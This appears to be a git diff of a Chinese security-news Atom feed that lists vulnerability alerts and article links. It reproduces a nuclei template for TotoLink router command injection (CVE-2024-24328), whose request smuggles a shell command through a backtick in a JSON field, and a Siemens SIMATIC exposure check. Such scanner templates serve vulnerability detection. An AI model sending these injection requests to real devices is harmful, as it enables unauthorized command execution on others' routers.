class="hljs-string">&#x27;contains(body_1, &quot;&quot;success&quot;:true&quot;) &amp;&amp; contains(body_2, &quot;bin&quot;) &amp;&amp; contains(body_2, &quot;etc&quot;)&#x27;</span><br>        <span class="hljs-attribute">condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; TotoLink Router setMacFilterRules - Command Injection&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CVE：&lt;/str</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>潘多拉魔盒：无限制大模型如何威胁加密行业安全？</title>
+    <link href="http://example.com/2025/06/04/weixin_3422943728/"/>
+    <id>http://example.com/2025/06/04/weixin_3422943728/</id>
+    <published>2025-06-04T10:52:34.794Z</published>
+    <updated>2025-06-04T10:52:34.792Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 慢雾科技</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/8pF-1XWTH17AfXfNcW7KCA">https://mp.weixin.qq.com/s/8pF-1XWTH17AfXfNcW7KCA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 慢雾科技&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/8pF-1XWTH17AfXfNcW7KCA&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="慢雾科技" scheme="http://example.com/tags/%E6%85%A2%E9%9B%BE%E7%A7%91%E6%8A%80/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>微软和CrowdStrike合作标准化黑客团体命名</title>
+    <link href="http://example.com/2025/06/04/weixin_525901164/"/>
+    <id>http://example.com/2025/06/04/weixin_525901164/</id>
+    <published>2025-06-04T10:50:56.301Z</published>
+    <updated>2025-06-04T10:50:56.302Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/x7zBzDI_IWg2DUUpxNHURA">https://mp.weixin.qq.com/s/x7zBzDI_IWg2DUUpxNHURA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/x7zBzDI_IWg2DUUpxNHURA&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>TI WooCommerce Wishlist 未授权访问漏洞</title>
@@ -429,35 +571,6 @@
   </entry>
   
   <entry>
-    <title>TotoLink Router setMacFilterRules - Command Injection</title>
-    <link href="http://example.com/2025/06/04/github_447170763/"/>
-    <id>http://example.com/2025/06/04/github_447170763/</id>
-    <published>2025-06-04T07:46:18.305Z</published>
-    <updated>2025-06-04T07:46:18.304Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> TotoLink Router setMacFilterRules - Command Injection</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-24328</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> TotoLink Router的’setMacFilterRules’功能存在命令注入漏洞，允许未经授权的攻击者执行任意命令。</p><p><strong>产品厂商：</strong> totolink</p><p><strong>产品名称：</strong> a3300r_firmware</p><p><strong>影响版本：</strong> 17.0.0cu.557_b20221024</p><p><strong>搜索语法：</strong> title&#x3D;”totolink”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b1ec88434ccfe3dde93757d235e0f99185c9c2ea/http%2Fcves%2F2024%2FCVE-2024-24328.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b1ec88434ccfe3dde93757d235e0f99185c9c2ea/http%2Fcves%2F2024%2FCVE-2024-24328.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2024-24328</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TotoLink Router setMacFilterRules - Command Injection</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">pussycat0x</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">critical</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">This template checks for a command injection vulnerability in TotoLink Router&#x27;s &#x27;setMacFilterRules&#x27;</span><br><span class="hljs-attribute">    functionality. The vulnerability allows unauthorized attackers to execute arbitrary commands.</span><br><span class="hljs-attribute">  reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/12/TOTOlink%20A3300R%20setMacFilterRules.md</span><br>  <span class="hljs-attribute">classification</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">cvss-metrics</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span><br>    <span class="hljs-attribute">cvss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">9.8</span><br>    <span class="hljs-attribute">cve-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2024-24328</span><br>    <span class="hljs-attribute">cwe-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CWE-78</span><br>    <span class="hljs-attribute">epss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.01075</span><br>    <span class="hljs-attribute">epss-percentile</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.76644</span><br>    <span class="hljs-attribute">cpe</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cpe:2.3:o:totolink:a3300r_firmware:17.0.0cu.557_b20221024:*:*:*:*:*:*:*</span><br>  <span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">vendor</span><span class="hljs-punctuation">:</span> <span class="hljs-string">totolink</span><br>    <span class="hljs-attribute">product</span><span class="hljs-punctuation">:</span> <span class="hljs-string">a3300r_firmware</span><br>    <span class="hljs-attribute">fofa-query</span><span class="hljs-punctuation">:</span> <span class="hljs-string">title=&quot;totolink&quot;</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cve,cve2024,kev,totolink,routers,unauth,intrusive</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">POST /cgi-bin/cstecgi.cgi?token=C6F41C563E86A379 HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">83</span><br>        <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/json, text/javascript, */*; q=0.01</span><br>        <span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">:</span> <span class="hljs-string">XMLHttpRequest</span><br>        <span class="hljs-attribute">Origin</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://&#123;&#123;BaseURL&#125;&#125;</span><br>        <span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://&#123;&#123;RootURL&#125;&#125;/advance/portfwd.html?token=C6F41C563E86A379</span><br>        <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate, br</span><br>        <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br>        <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">close</span><br><br>        &#123;&quot;enable&quot;:&quot;1`ls&gt;/web/&#123;&#123;randstr&#125;&#125;.txt`&quot;,&quot;addEffect&quot;:&quot;0&quot;,&quot;topicurl&quot;:&quot;setMacFilterRules&quot;&#125;<br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">GET /&#123;&#123;randstr&#125;&#125;.txt  HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://&#123;&#123;Hostname&#125;&#125;/advance/portfwd.html?token=C6F41C563E86A379</span><br>        <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate, br</span><br>        <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br>        <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">close</span><br><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: dsl</span><br>        <span class="hljs-attribute">dsl</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;status_code_1 == 200 &amp;&amp; status_code_2 == 200&#x27;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;contains(body_1, &quot;&quot;success&quot;:true&quot;) &amp;&amp; contains(body_2, &quot;bin&quot;) &amp;&amp; contains(body_2, &quot;etc&quot;)&#x27;</span><br>        <span class="hljs-attribute">condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; TotoLink Router setMacFilterRules - Command Injection&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;CVE：&lt;/str</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
     <title>WordPress File Away Plugin 未授权任意文件读取漏洞</title>
     <link href="http://example.com/2025/06/04/github_3084399164/"/>
     <id>http://example.com/2025/06/04/github_3084399164/</id>
@@ -483,116 +596,6 @@
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="文件读取" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>渗透Tips：自动收集GET请求URL</title>
-    <link href="http://example.com/2025/06/04/weixin_582272570/"/>
-    <id>http://example.com/2025/06/04/weixin_582272570/</id>
-    <published>2025-06-04T07:25:11.118Z</published>
-    <updated>2025-06-04T07:25:11.115Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> Z1Sec</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/rstPNC4VREtzSCpdhUyksA">https://mp.weixin.qq.com/s/rstPNC4VREtzSCpdhUyksA</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; Z1Sec&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/rstPNC4VREtzSCpdhUyksA&quot;&gt;https://mp.weixin.qq.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="Z1Sec" scheme="http://example.com/tags/Z1Sec/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVE-2025-48827：vbulletin代码执行POC</title>
-    <link href="http://example.com/2025/06/04/weixin_3931375163/"/>
-    <id>http://example.com/2025/06/04/weixin_3931375163/</id>
-    <published>2025-06-04T07:25:10.283Z</published>
-    <updated>2025-06-04T07:25:10.279Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> Z1Sec</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/-amP7XZmpIMNpGSac5G6aQ">https://mp.weixin.qq.com/s/-amP7XZmpIMNpGSac5G6aQ</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; Z1Sec&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/-amP7XZmpIMNpGSac5G6aQ&quot;&gt;https://mp.weixin.qq.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="Z1Sec" scheme="http://example.com/tags/Z1Sec/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>某优化版PHP九国语言交易所存在前台SQL注入漏洞</title>
-    <link href="http://example.com/2025/06/04/weixin_2180683961/"/>
-    <id>http://example.com/2025/06/04/weixin_2180683961/</id>
-    <published>2025-06-04T07:19:53.904Z</published>
-    <updated>2025-06-04T07:23:09.281Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 星悦安全</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/8Nb6aA0zCdKRqYqsjsEJrA">https://mp.weixin.qq.com/s/8Nb6aA0zCdKRqYqsjsEJrA</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 星悦安全&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/8Nb6aA0zCdKRqYqsjsEJrA&quot;&gt;https://mp.weixin.qq.c</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="星悦安全" scheme="http://example.com/tags/%E6%98%9F%E6%82%A6%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Siemens SIMATIC 300 未授权访问漏洞</title>
-    <link href="http://example.com/2025/06/04/github_630084760/"/>
-    <id>http://example.com/2025/06/04/github_630084760/</id>
-    <published>2025-06-04T07:16:00.397Z</published>
-    <updated>2025-06-04T07:23:09.277Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Siemens SIMATIC 300 未授权访问漏洞</p><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 发现Siemens SIMATIC S7-300的未授权暴露的Web界面，可能允许无需任何登录凭证即可访问。</p><p><strong>产品厂商：</strong> Siemens</p><p><strong>产品名称：</strong> SIMATIC S7-300</p><p><strong>搜索语法：</strong> title:”SIMATIC 300”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/48a4b2d60a87cef10999e5e5443004cb66ffc80d/http%2Fmisconfiguration%2Fsimatic-300-unauth.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/48a4b2d60a87cef10999e5e5443004cb66ffc80d/http%2Fmisconfiguration%2Fsimatic-300-unauth.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> simatic-<span class="hljs-number">30</span>0-unauth<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Siemens SIMATIC <span class="hljs-number">300</span> <span class="hljs-operator">-</span> Unauthenticated Dashboard<br>  <span class="hljs-params">author:</span> Th3l0newolf<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    An unauthenticated exposed web interface for Siemens SIMATIC S7-<span class="hljs-number">300</span> was discovered, potentially allowing access without any login credentials.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//new.siemens.com</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;SIMATIC 300&quot;</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>  <span class="hljs-params">tags:</span> siemens,simatic,plc,scada,iot,misconfig,unauth<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/Portal0000.htm&quot;</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;SIMATIC<span class="hljs-char escape_">\\</span>s*300&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;alt<span class="hljs-operator">=</span><span class="hljs-string">&quot;Simatic S7 CP&quot;</span>&#x27;<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Siemens SIMATIC 300 未授权访问漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;/strong&gt; 未授权访问&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞等级：&lt;/strong&gt; 高危&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
     
   </entry>
   
